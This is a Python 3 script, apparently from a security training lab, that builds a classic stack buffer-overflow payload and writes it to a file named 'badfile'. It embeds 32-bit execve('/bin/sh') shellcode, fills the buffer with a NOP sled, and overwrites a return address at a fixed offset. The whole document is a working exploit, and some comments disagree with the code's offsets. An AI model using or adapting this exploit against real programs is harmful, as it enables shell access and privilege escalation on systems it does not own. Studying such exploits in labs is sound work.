#!/usr/bin/python3
import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 


print(len(shellcode))

# Fill the content with NOPs 
content = bytearray(0x90 for i in range(528)) 

# Put the shellcode at the end 
start = 400 - len(shellcode) 
content[start:start+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffd218 + 4 - 300
content[480:484] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

